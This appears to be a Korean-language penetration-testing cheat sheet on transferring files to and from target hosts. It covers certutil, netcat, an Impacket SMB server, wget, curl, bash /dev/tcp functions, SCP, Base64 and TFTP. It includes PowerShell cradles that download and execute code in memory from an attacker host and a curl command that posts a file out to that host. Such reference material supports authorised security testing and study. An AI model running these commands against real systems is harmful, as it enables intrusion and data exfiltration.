---
sidebar_position: 5
---

# File Transfer

## Certutil (Windows)

```cmd
# 파일 다운로드
certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
```

## Netcat

```bash
# 수신 측 (파일 받기)
nc -lnvp <LPORT> > <FILE>

# 전송 측 (파일 보내기)
nc <RHOST> <RPORT> < <FILE>
```

## Impacket SMB Server

```bash
# SMB 서버 시작
sudo impacket-smbserver <SHARE> ./
sudo impacket-smbserver <SHARE> . -smb2support

# 인증 필요 시
sudo impacket-smbserver <SHARE> . -smb2support -username <USERNAME> -password <PASSWORD>
```

```cmd
# Windows에서 파일 복사
copy * \\<LHOST>\<SHARE>
copy <FILE> \\<LHOST>\<SHARE>\<FILE>

# 파일 실행
\\<LHOST>\<SHARE>\<FILE>.exe
```

## PowerShell

```powershell
# Invoke-WebRequest (별칭: iwr, wget, curl)
iwr http://<LHOST>/<FILE> -o <FILE>
Invoke-WebRequest -Uri http://<LHOST>/<FILE> -OutFile <FILE>

# 메모리에서 실행
IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/<FILE>')

# 파일 다운로드 (전체 경로)
powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>

# DownloadFile
(New-Object System.Net.WebClient).DownloadFile('http://<LHOST>/<FILE>', 'C:\temp\<FILE>')
```

## wget (Linux)

```bash
# 기본 다운로드
wget http://<LHOST>/<FILE>

# 파일명 지정
wget http://<LHOST>/<FILE> -O <OUTPUT>

# 재귀 다운로드
wget -r http://<LHOST>/

# 백그라운드 다운로드
wget -b http://<LHOST>/<FILE>
```

## curl (Linux)

```bash
# 기본 다운로드
curl http://<LHOST>/<FILE> -o <FILE>

# stdout 출력
curl http://<LHOST>/<FILE>

# POST 데이터 전송
curl -X POST -d @<FILE> http://<LHOST>:<LPORT>
```

## Python HTTP Server

```bash
# Python 2
sudo python -m SimpleHTTPServer 80

# Python 3
sudo python3 -m http.server 80

# 특정 디렉토리
cd /path/to/share
python3 -m http.server 8000
```

## Bash만 사용 (wget 없을 때)

### wget 함수

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}
```

```bash
# 사용
__wget http://<LHOST>/<FILE>
```

### curl 함수

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}
```

```bash
# 사용
__curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
```

## SCP

```bash
# 로컬 → 원격
scp <FILE> <USERNAME>@<RHOST>:/path/to/destination

# 원격 → 로컬
scp <USERNAME>@<RHOST>:/path/to/<FILE> .

# 디렉토리 복사
scp -r <DIRECTORY> <USERNAME>@<RHOST>:/path/to/destination
```

## Base64 인코딩/디코딩

```bash
# 파일을 Base64로 인코딩
base64 <FILE> > <FILE>.b64
cat <FILE> | base64 -w 0

# Base64 디코딩
base64 -d <FILE>.b64 > <FILE>
```

```powershell
# PowerShell Base64 인코딩
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\path\to\file"))

# PowerShell Base64 디코딩
[IO.File]::WriteAllBytes("C:\path\to\output", [Convert]::FromBase64String("<BASE64_STRING>"))
```

## FTP (별도 문서 참고)

```bash
ftp <RHOST>
# 또는
python3 -m pyftpdlib -p 21
```

## TFTP

```bash
# TFTP 서버 시작
sudo atftpd --daemon --port 69 /path/to/serve

# TFTP 클라이언트 (Windows)
tftp -i <LHOST> GET <FILE>
```

## 참고

- Windows: Certutil, PowerShell, SMB
- Linux: wget, curl, nc, scp
- Bash만 있는 경우: /dev/tcp 사용
- Base64로 텍스트 전송 가능
